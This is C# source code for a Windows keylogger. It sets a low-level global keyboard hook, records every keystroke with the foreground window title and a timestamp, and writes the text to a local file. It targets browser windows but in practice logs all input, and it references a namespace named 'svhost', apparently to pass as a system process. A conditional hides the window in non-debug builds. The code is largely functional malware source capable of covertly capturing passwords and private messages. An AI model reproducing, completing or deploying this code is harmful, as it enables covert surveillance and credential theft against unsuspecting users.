#define DBG
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;
using System.Linq;
using System.IO;
using System.Globalization;
using System.Runtime.InteropServices;
using svhost;

class BlockWindows
{
    private struct KeyMessage
    {
        private string _message;
        public string Message { get { return _message; } }

        public void Write()
        {
            if (Message.Length > 0)
            {
                string windowTitle = GetForeWindowTitle();
                using (StreamWriter sw = new StreamWriter("file.txt", true, Encoding.Unicode))
                {
                    sw.Write('[' + windowTitle + ']' + DateTime.Now.ToString());
                    sw.Write("\r\n" + _message + "\r\n");
                    _message = "";
                }
            }
        }

        public void AddChar(char c)
        {
            _message += c;
        }

    }

    static KeyMessage Message = new KeyMessage();
    static IntPtr keyBoardHook = IntPtr.Zero;
    static IntPtr winHook = (IntPtr)0;
    static Timer t = new Timer();
    public static void Main()
    {
        keyBoardHook = SetKeyBoardHook();
        ApplicationContext ctx = new ApplicationContext();
        ctx.ThreadExit += delegate(object sender, EventArgs e)
        {
            WinApi.UnhookWindowsHookEx(keyBoardHook);
        };
        IntPtr win = WinApi.FindWindow(null, GetForeWindowTitle());
        if (win != IntPtr.Zero)
        {
#if !DBG
                ShowWindow(win, 0);
#endif
#if DBG
            WinApi.ShowWindow(win, 1);     
#endif
        }
        t.Interval = 5000;
        t.Tick += (f, a) =>
            {
                Message.Write();
                t.Stop();
            };
        //winHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
        try
        {
            Application.Run(ctx);
        }
        catch (Exception) { }
    }

    private static CultureInfo CurrentCulture
    {
        get
        {
            IntPtr fore = WinApi.GetForegroundWindow();
            uint tpid = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero);
            IntPtr hKL = WinApi.GetKeyboardLayout(tpid);
            hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
            return new System.Globalization.CultureInfo(hKL.ToInt32());
        }
    }

    static string GetCharsFromKeys(Keys keys, bool shift, bool altGr)
    {
        var buf = new StringBuilder(256);
        var keyboardState = new byte[256];
        if (shift)
            keyboardState[(int)Keys.ShiftKey] = 0xff;
        if (altGr)
        {
            keyboardState[(int)Keys.ControlKey] = 0xff;
            keyboardState[(int)Keys.Menu] = 0xff;
        }
        WinApi.ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);
        return buf.ToString();
    }
    private static IntPtr SetKeyBoardHook()
    {
        Process curProcess = Process.GetCurrentProcess();
        ProcessModule curModule = curProcess.MainModule;
        return WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL,
                                HookCallback,
                                WinApi.GetModuleHandle(curModule.ModuleName),
                                0);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            if (IsBrowser(GetForeWindowTitle()) && (wParam == (IntPtr)WinApi.WM_KEYDOWN))
            {
                int code = Marshal.ReadInt32(lParam);
                Keys key = (Keys)code;

                if (!IsDisalovedKey(key))
                {
                    StringBuilder b = new StringBuilder(100);

                    IntPtr fore = WinApi.GetForegroundWindow();

                    uint tpid = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero);//user for get keyboard layout
                    IntPtr hKL = WinApi.GetKeyboardLayout(tpid);
                    hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);

                    byte[] keys = new byte[256];//used for get keyboard state
                    WinApi.GetKeyboardState(keys);
                    WinApi.ToUnicodeEx(
                            (uint)key,
                            (uint)key,
                            keys,
                            b,
                            100,
                            0,
                            hKL
                        );
                    #region WAT
                    //?????
                    if (Control.IsKeyLocked(Keys.CapsLock))
                    {
                     
                    }

                    if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                    {
                    }
                    //?????
                    #endregion
                    Message.AddChar(b[0]);
                    Console.WriteLine(Message.Message);
                    Console.WriteLine(WinApi.GetAsyncKeyState(key));
                    t.Stop();
                }
            }

            if (IsBrowser(GetForeWindowTitle()) && (wParam == (IntPtr)WinApi.WM_KEYUP))
            {
                t.Start();
            }
        }
        catch (Exception) { }
        return WinApi.CallNextHookEx(keyBoardHook, nCode, wParam, lParam);
    }

    private static bool IsDisalovedKey(Keys key)
    {
        return new List<Keys>
        {
            Keys.LShiftKey,
            Keys.RShiftKey,
            Keys.LControlKey,
            Keys.RControlKey,
            Keys.CapsLock
        }.Contains(key);
    }

    private static string GetForeWindowTitle()
    {
        IntPtr fore = WinApi.GetForegroundWindow();

        const int count = 512;
        StringBuilder title = new StringBuilder(count);
        int t = WinApi.GetWindowText(fore, title, count);

        return (t > 0) ? title.ToString() : "";
    }

    private static string[] _browsers = new string[2]
    {
                "Google Chrome",
                "Mozilla Firefox"
    };

    private static bool IsBrowser(string str)
    {
        return true;
        return (from b in _browsers
                where str.IndexOf(b) != -1
                select b).Count() > 0;
    }

    static string GetCharPressed(Keys key)
    {
        KeysConverter k = new KeysConverter();

        return k.ConvertToString(key);
    }

    public static void WinChangeProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
    {
        MessageBox.Show("hello");
    }

}
